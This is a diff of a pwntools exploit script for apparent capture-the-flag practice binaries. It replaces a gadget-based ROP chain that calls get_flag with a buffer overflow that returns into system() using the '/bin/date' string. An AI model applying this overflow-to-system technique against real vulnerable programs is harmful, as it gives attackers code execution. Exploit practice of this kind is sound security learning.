@@ -1,39 +1,31 @@
 from pwn import *
 # Set up the binary and context
-binary = './pwn/stack/rop-9/rop9'
-elf = ELF(binary)
-context.binary = binary
-context.terminal = ['tmux', 'splitw', '-h']
+context.binary = './pwn/stack/rop-2/rop2'
+binary = ELF('./pwn/stack/rop-2/rop2')
 
-# Start the process or connect to the remote service
-p = process(binary)
-# If remote, use: p = remote('host', port)
+# Start the process
+p = process(binary.path)
 
-# Gadgets and addresses
-pop_eax = 0x080b91e6  # pop eax ; ret
-pop_ebx = 0x080481ad  # pop ebx ; ret
-pop_ecx_ebx = 0x0806fc31  # pop ecx ; pop ebx ; ret
-pop_edx = 0x0806fc0a  # pop edx ; ret
-int_80 = 0x08049563  # int 0x80
-get_flag = elf.symbols['get_flag']
+# Offsets and addresses
+buffer_size = 136  # Size of the buffer before return address
+system_plt = binary.plt['system']  # Address of system function
+bin_date = next(binary.search(b'/bin/date'))  # Address of '/bin/date' string
 
-# Arguments for get_flag
-a1 = 814536271
-a2 = 425138641
+# Debugging: Print key addresses
+log.info(f"system@plt: {hex(system_plt)}")
+log.info(f"/bin/date address: {hex(bin_date)}")
 
-# Offset to return address
-offset = 56
+# ROP chain
+payload = b'A' * buffer_size  # Overflow buffer
+payload += p32(system_plt)  # Address of system function
+payload += b'BBBB'  # Return address after system (can be anything)
+payload += p32(bin_date)  # Address of '/bin/date' string
 
-# Craft the payload
-payload = b'A' * offset
-payload += p32(pop_eax)
-payload += p32(a1)
-payload += p32(pop_ebx)
-payload += p32(a2)
-payload += p32(get_flag)
+# Debugging: Print the payload
+log.info(f"Payload: {payload}")
 
 # Send the payload
 p.sendline(payload)
 
-# Interact with the process to get the flag
+# Interact with the process to see the output
 p.interactive()
